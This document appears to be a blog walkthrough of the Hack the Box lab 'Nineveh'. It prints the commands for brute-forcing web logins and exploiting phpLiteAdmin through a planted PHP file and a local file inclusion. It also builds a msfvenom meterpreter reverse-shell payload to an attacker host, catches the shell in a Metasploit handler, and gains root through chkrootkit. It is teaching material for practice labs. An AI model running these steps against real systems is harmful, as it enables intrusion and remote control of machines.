									Today we are going to solve another CTF challenge “Nineveh” which is categories as retired lab presented by Hack the Box for making online penetration practices. 
Level: Intermediate
Task: find user.txt and root.txt file on the victim’s machine.
Penetration Methodology
Scanning

Open port and running services (Nmap)

Enumeration

Enumerating Web Directories (Dirb)

Exploiting

Brute force on PHPliteAdmin (Burp Suite)
Spawning Shell (Metasploit)
Get user.txt

Privilege Escalation

User.txt

Walk-Through
Scanning
Since these labs are online accessible therefore they have static IP. The IP of Nineveh is 10.10.10.43 so let’s initiate with nmap port enumeration.

		
		
			
			
			
			
nmap -A 10.10.10.43
			
				
					
				
					1
				
						nmap -A 10.10.10.43
					
				
			
		

it enumerated port 80 and 443 are open.

We explored port 80 but didn’t observe any remarkable clue for next step.

Enumeration
So next, we use the dirb tool of Kali to enumerate the directories and found some important directories such as http://10.10.10.43/department/  then went to the web browser to explore them.

		
		
			
			
			
			
dirb http://10.10.10.43 /usr/share/wordlists/dirb/big.txt
			
				
					
				
					1
				
						dirb http://10.10.10.43 /usr/share/wordlists/dirb/big.txt
					
				
			
		


It put-up login page as shown here.

So we try the random combination of username and password. While we have enter username: admin and Password: password it gave an error “Invalid Password” hence it was sure that the username must be the admin.

Then with help of burp suit, we made brute force attack and use the rockyou.txt file as password dictionary. Thus we obtain the correct combination for login.

		
		
			
			
			
			
Username: admin
Password: 1q2w3e4r5t
			
				
					
				
					12
				
						Username: adminPassword: 1q2w3e4r5t
					
				
			
		


 
Used above credential for login and get into admin console as shown.

At Notes tab we concluded that the given text of a file stored at someplace in the system entitled with ninevehNotes.txt.

After that we also explored port 443 and observe the following web page. We also look at it view source but didn’t notice any further hint.

Therefore again use dirb tool for directory brute force attack and observe the /db directory.

		
		
			
			
			
			
dirb https://10.10.10.43 /usr/share/wordlists/dirb/big.txt
			
				
					
				
					1
				
						dirb https://10.10.10.43 /usr/share/wordlists/dirb/big.txt
					
				
			
		


Exploiting
For a second time, we explored the above-enumerated directory and observe login page for phpliteAdmin v1.9.

Again we lunch brute forced the password field on /db with burp suit and got the password: password123.

By using password123 and we get inside the PHPLiteAdmin dashboard. Then with help of Google, we found the trick to exploit it after reading the description from exploit DB 24044.

After reading the description from exploit 24044 then we create a new database “ninevehNotes.txt.shell.php”

Here we have created a new table “Demo” and Add! Filed inside this.

Now create an entry in filed 1 as shown.

Let’s create a PHP payload for injecting inside the new database. We have to use the msfvenom command for generating PHP backdoor.

		
		
			
			
			
			
msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.25 lport=4444 -f raw
			
				
					
				
					1
				
						msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.25 lport=4444 -f raw
					
				
			
		

Now copy the code from *&lt;?php….die(); and start multi handler in a new terminal

GO to insert tab and Past above-copied code inside the text field given for Value.

At last you will notice /var/tmp/ ninevehNotes.txt.shell.php is the Path for your database.

If you remember, we had already access admin console and observed a tab for Notes, use it to execute your backdoor.

		
		
			
			
			
			
http://10.10.10.43/department/manage.php?notes=/var/tmp/ninevehNotes.txt.shell.php
			
				
					
				
					1
				
						http://10.10.10.43/department/manage.php?notes=/var/tmp/ninevehNotes.txt.shell.php
					
				
			
		


Meanwhile, return to the Metasploit terminal and wait for the meterpreter session by exploiting multi handler.

		
		
			
			
			
			
msf use exploit/multi/handler
msf exploit(multi/handler) set payload php/meterpreter/reverse_tcp
msf exploit(multi/handler) set lhost 10.10.14.25
msf exploit(multi/handler) set lport 4444
msf exploit(multi/handler) exploit
			
				
					
				
					12345
				
						msf use exploit/multi/handlermsf exploit(multi/handler) set payload php/meterpreter/reverse_tcpmsf exploit(multi/handler) set lhost 10.10.14.25msf exploit(multi/handler) set lport 4444msf exploit(multi/handler) exploit
					
				
			
		

From given below image you can observe meterpreter session 1. But the task is not finished yet, still, we need to penetrate more for privilege escalation.

		
		
			
			
			
			
meterpreter &gt; sysinfo
meterpreter &gt; cd /home
meterpreter &gt; ls
meterpreter &gt; cd amrois
meterpreter &gt;ls
meterpreter &gt; cat user.txt
			
				
					
				
					123456
				
						meterpreter &gt; sysinfometerpreter &gt; cd /homemeterpreter &gt; lsmeterpreter &gt; cd amroismeterpreter &gt;lsmeterpreter &gt; cat user.txt
					
				
			
		


Privilege Escalation 
After doing a little bit enumeration we notice a directory report is owned by the user amrois and these reports were being continuously generated by chkrootkit in every minute.
With help of Google, we came to know that Metasploit contains an exploit for chkrootkit exploitation. After entering following command as shown in the given image to load exploit/unix/local/chkrootkit module then set session 1 and arbitrary lport such as 4545 and run the module.
This will give another session, as you can see we have spawned command shell of the target’s machine. Now if you will check uid by typing id it will show uid=0 as root.

		
		
			
			
			
			
id
cd /root
			
				
					
				
					12
				
						idcd /root
					
				
			
		

And to see the list of files in /root type:

		
		
			
			
			
			
ls -lsa
			
				
					
				
					1
				
						ls -lsa
					
				
			
		

In the list you will see that there is a text file and read that file type :

		
		
			
			
			
			
cat root.txt
			
				
					
				
					1
				
						cat root.txt
					
				
			
		

Congrats!! We hit Goal finished both tasks and at end obtain the root access.
